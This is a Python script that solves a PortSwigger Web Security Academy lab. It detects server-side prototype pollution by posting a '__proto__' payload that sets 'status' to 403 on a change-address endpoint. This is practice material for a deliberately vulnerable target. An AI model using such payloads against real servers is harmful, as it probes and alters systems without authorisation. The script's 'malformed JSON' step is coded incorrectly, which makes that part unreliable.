'''
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.

You can log in to your own account with the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0a86008004c1a54c86866c93004a002f' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'csrf' : token,
            "username" : "wiener",
            "password": "peter"
    }
    r2 = s.post(uri, json=data)   

    # we can post to the change-address endpoint and use prototype pollution change the status message to something we can check in the response
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
    
    # we will choose the 403 status code for 
    data = {"address_line_1":"Wiener HQ",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":s.cookies.get_dict()['session'],
            "__proto__": {
                "status":403
            }
        }
    r3 = s.post(uri, json=data)
    

    # now send a purposely malformed json
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
    data = '''{"address_line_1":"Wiener HQ",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":s.cookies.get_dict()['session'],
            "__proto__": {
                "status": 403
        }'''
    r4 = s.post(uri, json=data)
    # if sucessful 403 should be the status code in the response
    print(r4.text)
    print('finished')


if __name__ == '__main__':
    main()